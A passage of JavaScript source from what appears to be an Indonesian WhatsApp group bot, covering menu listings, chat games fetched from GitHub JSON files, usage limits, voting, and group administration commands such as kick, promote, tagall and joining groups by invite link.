            }
            break

case 'cekmenu': {
pimbon = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *CEK MENU* 」
│➵ ${prefix}goblokcek 
│➵  ${prefix}jelekcek 
│➵  ${prefix}rate
│➵  ${prefix}haram
│➵  ${prefix}gaycek
│➵  ${prefix}lesbicek
│➵  ${prefix}gantengcek 
│➵  ${prefix}cantikcek
│➵  ${prefix}begocek 
│➵  ${prefix}suhucek
│➵  ${prefix}pintercek
│➵  ${prefix}jagocek
│➵  ${prefix}nolepcek
│➵  ${prefix}babicek
│➵  ${prefix}bebancek
│➵  ${prefix}baikcek
│➵  ${prefix}jahatcek
│➵  ${prefix}anjingcek
│➵  ${prefix}haramcek
│➵  ${prefix}pakboycek
│➵  ${prefix}pakgirlcek
│➵  ${prefix}sangecek 
│➵  ${prefix}bapercek
│➵  ${prefix}fakboycek
│➵  ${prefix}alimcek
│➵  ${prefix}suhucek
│➵  ${prefix}fakgirlcek
│➵  ${prefix}kerencek
│➵  ${prefix}wibucek
│➵  ${prefix}pasarkascek
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, pimbon, nyoutube, m, {quoted: fkontak})
            }
            break
            case 'mcerpen': {
pen = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *RANDOM CERPEN* 」
│➵  ${prefix}cerpen
│➵  ${prefix}cerpen-sejarah
│➵  ${prefix}cerpen-sedih
│➵  ${prefix}cerpen-sastra
│➵  ${prefix}cerpen-romantis
│➵  ${prefix}cerpen-rohani
│➵  ${prefix}cerpen-rindu
│➵  ${prefix}cerpen-remaja
│➵  ${prefix}cerpen-ramadhan
│➵  ${prefix}cerpen-petualangan
│➵  ${prefix}cerpen-persahabatan
│➵  ${prefix}cerpen-perpisahan
│➵  ${prefix}cerpen-perjuangan
│➵  ${prefix}cerpen-penyesalan
│➵  ${prefix}cerpen-pengorbanan
│➵  ${prefix}cerpen-pengalaman
│➵  ${prefix}cerpen-pendidikan
│➵  ${prefix}cerpen-penantian
│➵  ${prefix}cerpen-patahhati
│➵  ${prefix}cerpen-olahraga
│➵  ${prefix}cerpen-nasionalisme
│➵  ${prefix}cerpen-nasihat
│➵  ${prefix}cerpen-motivasi
│➵  ${prefix}cerpen-misteri
│➵  ${prefix}cerpen-mengharukan
│➵  ${prefix}cerpen-malaysia
│➵  ${prefix}cerpen-liburan
│➵  ${prefix}cerpen-kristen
│➵  ${prefix}cerpen-korea
│➵  ${prefix}cerpen-kisahnyata
│➵  ${prefix}cerpen-keluarga
│➵  ${prefix}cerpen-kehidupan
│➵  ${prefix}cerpen-jepang
│➵  ${prefix}cerpen-inspiratif
│➵  ${prefix}cerpen-gokil
│➵  ${prefix}cerpen-galau
│➵  ${prefix}cerpen-cintasejati
│➵  ${prefix}cerpen-cintasegitiga
│➵  ${prefix}cerpen-cintasedih
│➵  ${prefix}cerpen-cintaromantis
│➵  ${prefix}cerpen-cintapertama
│➵  ${prefix}cerpen-cintaislami
│➵  ${prefix}cerpen-cinta
│➵  ${prefix}cerpen-budaya
│➵  ${prefix}cerpen-bahasasunda
│➵  ${prefix}cerpen-bahasajawa
│➵  ${prefix}cerpen-bahasainggris
│➵  ${prefix}cerpen-bahasadaerah
│➵  ${prefix}cerpen-anak
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, pen, nyoutube, m, {quoted: fkontak})
            }
            break
case 'soundmenu': {
sond = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Sound Menu* 」
│➵  ${prefix}sound1
│➵  ${prefix}sound2
│➵  ${prefix}sound3
│➵  ${prefix}sound4
│➵  ${prefix}sound5
│➵  ${prefix}sound6
│➵  ${prefix}sound7
│➵  ${prefix}sound8
│➵  ${prefix}sound9
│➵  ${prefix}sound10
│➵  ${prefix}sound11
│➵  ${prefix}sound12
│➵  ${prefix}sound13
│➵  ${prefix}sound14
│➵  ${prefix}sound15
│➵  ${prefix}sound16
│➵  ${prefix}sound17
│➵  ${prefix}sound18
│➵  ${prefix}sound19
│➵  ${prefix}sound20
│➵  ${prefix}sound21
│➵  ${prefix}sound22
│➵  ${prefix}sound23
│➵  ${prefix}sound24
│➵  ${prefix}sound25
│➵  ${prefix}sound26
│➵  ${prefix}sound27
│➵  ${prefix}sound28
│➵  ${prefix}sound29
│➵  ${prefix}sound30
│➵  ${prefix}sound31
│➵  ${prefix}sound32
│➵  ${prefix}sound33
│➵  ${prefix}sound34
│➵  ${prefix}sound35
│➵  ${prefix}sound36
│➵  ${prefix}sound37
│➵  ${prefix}sound38
│➵  ${prefix}sound39
│➵  ${prefix}sound40
│➵  ${prefix}sound41
│➵  ${prefix}sound42
│➵  ${prefix}sound43
│➵  ${prefix}sound44
│➵  ${prefix}sound45
│➵  ${prefix}sound46
│➵  ${prefix}sound47
│➵  ${prefix}sound48
│➵  ${prefix}sound49
│➵  ${prefix}sound50
│➵  ${prefix}sound51
│➵  ${prefix}sound52
│➵  ${prefix}sound53
│➵  ${prefix}sound54
│➵  ${prefix}sound55
│➵  ${prefix}sound56
│➵  ${prefix}sound57
│➵  ${prefix}sound58
│➵  ${prefix}sound59
│➵  ${prefix}sound60
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, sond, nyoutube, m, {quoted: fkontak})
            }
            break

            
        case 'runtime': {
            	let lowq = `*Bot Telah Online Selama*\n*${runtime(process.uptime())}*`
                dica.sendMessage(m.chat, { text: lowq }, {quoted: m})
                dica.setStatus(`Kilaa | Runtime : ${runtime(process.uptime())}`)
            	}
            break
        
 case 'ttc': case 'ttt': case 'tictactoe': {
        	if (!m.isGroup) throw mess.group
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await dica.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await dica.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            dica.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *menantang* @${m.mentionedJid[0].split`@`[0]} *untuk bermain suit*

*Silahkan* @${m.mentionedJid[0].split`@`[0]} *untuk ketik terima/tolak*`
            this.suit[id] = {
            chat: await dica.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) dica.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await dica.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break

case 'ceklimit': case 'checklimit': case 'limit':{
					m.reply(`Limit kamu adalah ${isPremium ? '♾𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲' : `〽️${db.data.users[m.sender].limit}`}/100 \n\nKamu dapat membeli premium user untuk mendapatkan limit unlimited, ketik .owner\n\nLimit akan diriset pada pukul 12.00 setiap harinya`)
					}
					break 
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Contoh : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await dica.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    dica.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    dica.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, dica.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    dica.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    dica.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, dica.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    dica.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    dica.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, dica.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    dica.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    dica.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, dica.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    dica.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    dica.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, dica.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    dica.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    dica.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, dica.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                dica.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, jawab, dica.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa DONASI Ke *dica*🗿

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jadian' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, jawab, dica.user.name, m, {mentions: menst})
            }
            break
            case 'gbtku': {
            if (!isPremium) throw mess.premime
			if (!text) throw `Contoh : ${prefix + command} hai|halo`
            let jawab = `${text.split("|")[0]}`
            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `` }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
            }
            break
            
           
//Pembatas
            case 'react': {
                if (!itsMeDica) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                dica.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join':{
    dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/hai.mp3`)
    if (!text) throw 'Link Groupnya Mana?!'
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Apa yg harus di join?!'
    m.reply('oke otw');
    let result = args[0].split('https://chat.whatsapp.com/')[1]
    let jumlah = "1"
    for (let i = 0; i < jumlah; i++) {
        let kir = await dica.groupAcceptInvite(result);
        let buttons = [
{ buttonId: 'store', buttonText: { displayText: 'CEK HARGA' }, type: 1,
horizontalAlignment: "LEFT" },
{ buttonId: 'inprogres', buttonText: { displayText: '👥OWNER' }, type: 1 ,
horizontalAlignment: "RIGHT" }
]

        if (kir) {
        	await dica.sendMessage(kir, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true });
            dica.sendButtonText(kir, buttons, mess.jasher );
            await new Promise(resolve => setTimeout(resolve, 3000));
            dica.sendContact(kir, global.owner)
            console.log("Bot berhasil masuk ke grup: " + kir)
            m.reply('✅Done')
            // fungsi bot keluar dari grup setelah 2 menit
            setTimeout(function(){ dica.groupLeave(kir) }, 100000);
            
        } else {
            console.log("Gagal masuk ke grup")
            m.reply('Gabisa Join 😌 ')
        }
    }
}
break;
case '👥': {
	if (!itsMeDica) throw mess.owner
                dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/hai.mp3`)
    if (!text) throw 'Link Groupnya Mana?!'
    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Apa yg harus di join?!'
    m.reply('oke otw');
    let result = args[0].split('https://chat.whatsapp.com/')[1]
    let jumlah = "1"
    for (let i = 0; i < jumlah; i++) {
        let kir = await dica.groupAcceptInvite(result);
        let buttons = [
{ buttonId: 'store', buttonText: { displayText: 'CEK HARGA' }, type: 1,
horizontalAlignment: "LEFT" },
{ buttonId: 'menu', buttonText: { displayText: 'MENU' }, type: 1 ,
horizontalAlignment: "RIGHT" }
]

        if (kir) {
        	await dica.sendMessage(kir, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true });
            dica.sendButtonText(kir, buttons, mess.jasher );
            await new Promise(resolve => setTimeout(resolve, 3000));
            dica.sendContact(kir, global.owner)
            console.log("Bot berhasil masuk ke grup: " + kir)
            m.reply('✅Done')
            // fungsi bot keluar dari grup setelah 2 menit
            
            
        } else {
            console.log("Gagal masuk ke grup")
            m.reply('Gabisa Join 😌 ')
        }
    }
}
break;
            
	case 'kick': {
		
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw 'Jadiin kilaa admin dulu'
                if (!isAdmins) throw 'Lu siapa anj*, kusus admin'
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')
		teks = users + ' Kasihan mau di kick'
		dica.sendMessage(m.chat, { text: teks})
		await new Promise(resolve => setTimeout(resolve, 3000));
		await dica.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(mess.success)).catch((err) => m.reply(`❌Tag Org yang mau di kick lah`))
	}
	break
	/**case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await dica.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(mess.success)).catch((err) => m.reply(mess.error))
	}
	break**/
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins && !itsMeDica) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await dica.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(mess.succes)).catch((err) => m.reply(mess.error))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await dica.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!itsMeDica) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await dica.updateBlockStatus(users, 'block').then((res) => m.reply(mess.success)).catch((err) => m.reply(mess.error))
	}
	break
        case 'unblock': {
		if (!itsMeDica) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await dica.updateBlockStatus(users, 'unblock').then((res) => m.reply(mess.success)).catch((err) => m.reply(mess.error))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await dica.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(mess.error))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await dica.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppkila': {
                if (!itsMeDica) throw mess.owner
                if (!isPremium) throw mess.premime
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await dica.downloadAndSaveMediaMessage(quoted)
                await dica.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
//pake ini ke banned njir
         case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await dica.downloadAndSaveMediaMessage(quoted)
                await dica.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break 
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins && !itsMeDica) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `• @${mem.id.split('@')[0]}\n`
                }
                dica.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins && !itsMeDica) throw mess.admin
            dica.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': {
		db.data.users[m.sender].limit -= 1 // -1 limit

		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Mana text nya?!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `• *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Contoh: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: dica.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            dica.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*
